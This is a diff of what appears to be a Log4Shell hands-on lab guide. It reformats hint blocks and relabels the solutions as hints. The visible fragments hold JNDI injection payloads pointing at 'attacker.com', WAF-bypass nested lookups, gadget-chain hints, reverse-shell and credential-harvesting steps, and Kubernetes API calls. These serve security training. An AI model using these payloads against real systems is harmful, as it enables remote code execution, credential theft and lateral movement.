@@ -102,9 +102,7 @@ Java Naming and Directory Interface - allows Java apps to look up resources:
 **Setup**: Start the Log4Shell vulnerable app  
 **Goal**: Achieve remote code execution
 
-<details>
-<summary>💡 Hint 1: Find injection points</summary>
-
+:::hint 💡 Hint 1: Find injection points
 Look for any input that might be logged:
 - User-Agent headers
 - Form inputs
@@ -114,11 +112,9 @@ Look for any input that might be logged:
 
 Try a test payload: `${java:version}`
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Set up LDAP server</summary>
-
+:::hint 💡 Hint 2: Set up LDAP server
 You need an LDAP server that serves malicious responses. Tools:
 - marshalsec
 - JNDI-Injection-Exploit
@@ -126,11 +122,9 @@ You need an LDAP server that serves malicious responses. Tools:
 
 Or use a hosted service for testing.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Craft the payload</summary>
-
+:::hint 💡 Hint 3: Craft the payload
 Basic syntax:
 ```
 ${jndi:ldap://your-server:1389/Exploit}
@@ -138,11 +132,9 @@ ${jndi:ldap://your-server:1389/Exploit}
 
 Make sure your server is reachable from the target!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Set up LDAP server
 ```bash
 # Using marshalsec
@@ -193,7 +185,7 @@ http://vulnerable-app.com/search?q=${jndi:ldap://attacker.com:1389/Exploit}
 **Step 4**: Catch the callback
 Monitor your web server and LDAP server logs for connections!
 
-</details>
+:::
 
 ---
 
@@ -202,18 +194,14 @@ Monitor your web server and LDAP server logs for connections!
 **Setup**: Target with WAF blocking "jndi" and "ldap"  
 **Goal**: Bypass filtering and achieve RCE
 
-<details>
-<summary>💡 Hint 1: Case variations</summary>
-
+:::hint 💡 Hint 1: Case variations
 Log4j lookups are case-insensitive in some parts:
 - `${jNdI:LdAp://...}`
 - But not all parsers handle this the same way!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Nested lookups</summary>
-
+:::hint 💡 Hint 2: Nested lookups
 Log4j resolves lookups recursively:
 ```
 ${${lower:j}ndi:...}
@@ -222,11 +210,9 @@ ${j${::-}ndi:...}
 
 What other lookups can you nest?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Alternative protocols</summary>
-
+:::hint 💡 Hint 3: Alternative protocols
 JNDI supports multiple protocols:
 - ldap://
 - ldaps://
@@ -235,11 +221,9 @@ JNDI supports multiple protocols:
 
 Some might not be filtered!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Bypass Techniques**:
 
 1. **Nested Variable Resolution**
@@ -310,7 +294,7 @@ for payload in payloads:
     print(f"Payload: {payload[:30]}... - Status: {response.status_code}")
 ```
 
-</details>
+:::
 
 ---
 
@@ -319,19 +303,15 @@ for payload in payloads:
 **Setup**: Targets running Java 9+ with security restrictions  
 **Goal**: Achieve RCE despite trustURLCodebase restrictions
 
-<details>
-<summary>💡 Hint 1: Understanding the restriction</summary>
-
+:::hint 💡 Hint 1: Understanding the restriction
 Java 9+ sets `com.sun.jndi.ldap.object.trustURLCodebase=false` by default.
 This prevents loading classes from remote codebases.
 
 What attack vectors remain?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Local gadgets</summary>
-
+:::hint 💡 Hint 2: Local gadgets
 Instead of remote classes, use classes already on the classpath:
 - Tomcat BeanFactory
 - Groovy
@@ -339,11 +319,9 @@ Instead of remote classes, use classes already on the classpath:
 
 Research "JNDI injection gadgets"
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Serialization attacks</summary>
-
+:::hint 💡 Hint 3: Serialization attacks
 If the app has gadget libraries:
 - Commons Collections
 - Spring
@@ -351,11 +329,9 @@ If the app has gadget libraries:
 
 You might use deserialization!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Method 1: Tomcat BeanFactory (requires Tomcat)**
 ```java
 // LDAP server returns Reference with BeanFactory
@@ -421,7 +397,7 @@ else:
     payload = "${jndi:ldap://attacker.com:1389/Deserialization}"
 ```
 
-</details>
+:::
 
 ---
 
@@ -430,40 +406,32 @@ else:
 **Setup**: You have RCE via Log4Shell  
 **Goal**: Establish persistence and explore
 
-<details>
-<summary>💡 Hint 1: Reverse shell stability</summary>
-
+:::hint 💡 Hint 1: Reverse shell stability
 Initial RCE might be unstable. Establish a proper shell:
 - Reverse TCP shell
 - Web shell
 - Scheduled task/cron
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Credential harvesting</summary>
-
+:::hint 💡 Hint 2: Credential harvesting
 Look for:
 - Environment variables
 - Configuration files
 - Database credentials
 - Cloud credentials
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Lateral movement</summary>
-
+:::hint 💡 Hint 3: Lateral movement
 From the compromised server:
 - Internal network scanning
 - Other vulnerable services
 - Shared credentials
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Stable Reverse Shell**:
 ```java
 // Exploit.java with reverse shell
@@ -535,7 +503,7 @@ cat ~/.bash_history
 cat ~/.mysql_history
 ```
 
-</details>
+:::
 
 ---
 
@@ -543,29 +511,23 @@ cat ~/.mysql_history
 
 **Goal**: Exploit complex real-world scenarios
 
-<details>
-<summary>🎯 Challenge 1: Containerized Environment</summary>
-
+:::hint 🎯 Hint 1
 Target is in Docker/Kubernetes. How do you:
 1. Escape the container?
 2. Access other pods?
 3. Reach the cloud metadata?
 
-</details>
+:::
 
-<details>
-<summary>🎯 Challenge 2: Data Exfiltration</summary>
-
+:::hint 🎯 Hint 2
 No reverse shell possible (egress filtering). How do you:
 1. Exfiltrate data via DNS?
 2. Use timing attacks?
 3. Leverage error messages?
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solutions</summary>
-
+:::hint 🔓 Hint 3
 **Container Escape**:
 ```java
 // Check if in container
@@ -650,7 +612,7 @@ curl -k -X POST -H "Authorization: Bearer $TOKEN" \
      $API/api/v1/namespaces/default/pods
 ```
 
-</details>
+:::
 
 ---
 
